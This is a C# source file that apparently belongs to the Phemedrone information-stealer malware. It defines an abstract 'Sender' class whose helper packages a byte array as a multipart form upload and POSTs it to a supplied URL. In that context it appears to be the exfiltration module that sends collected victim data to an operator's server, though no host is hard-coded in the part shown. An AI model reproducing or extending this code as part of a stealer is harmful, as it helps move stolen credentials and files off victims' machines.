using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace Phemedrone.Senders
{
    public abstract class ISender
    {
        protected object[] Arguments;

        protected ISender(params object[] args)
        {
            Arguments = args;
        }
        
        public abstract void Send(byte[] data);

        protected void MakeFormRequest(string url, string file, string filename, byte[] fileData, params KeyValuePair<string, string>[] values)
        {
            ServicePointManager.DefaultConnectionLimit = 1000;
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            
            var request = (HttpWebRequest) WebRequest.Create(url);
            request.Method = "POST";
            request.Timeout = 30 * 1000;
            
            var boundary = "----------------------------" + DateTime.Now.Ticks.ToString("x");
            request.ContentType = "multipart/form-data; boundary=" + boundary;
            
            using (var formDataStream = new MemoryStream())
            {
                var formDataWriter = new StreamWriter(formDataStream);
                formDataWriter.WriteLine("--" + boundary);
                formDataWriter.WriteLine($"Content-Disposition: form-data; name=\"{file}\"; filename=\"{filename}\"");
                formDataWriter.WriteLine("Content-Type: application/octet-stream");
                formDataWriter.WriteLine();
                formDataWriter.Flush();

                using (var fileStream = new MemoryStream(fileData))
                {
                    fileStream.CopyTo(formDataStream);
                    fileStream.Close();
                }

                formDataWriter.WriteLine();
                formDataWriter.WriteLine("--" + boundary);

                for (var i = 0; i < values.Length; i++)
                {
                    var keyValue = values[i];
                    formDataWriter.WriteLine($"Content-Disposition: form-data; name=\"{keyValue.Key}\"");
                    formDataWriter.WriteLine();
                    formDataWriter.WriteLine(keyValue.Value);
                    formDataWriter.WriteLine("--" + boundary + (i + 1 >= values.Length ? "--" : ""));
                }
                formDataWriter.Flush();
                
                request.ContentLength = formDataStream.Length;
                formDataStream.Position = 0;
                
                using (var requestStream = request.GetRequestStream())
                {
                    formDataStream.CopyTo(requestStream);
                    requestStream.Close();
                }
            }
            request.GetResponse();
        }
    }
}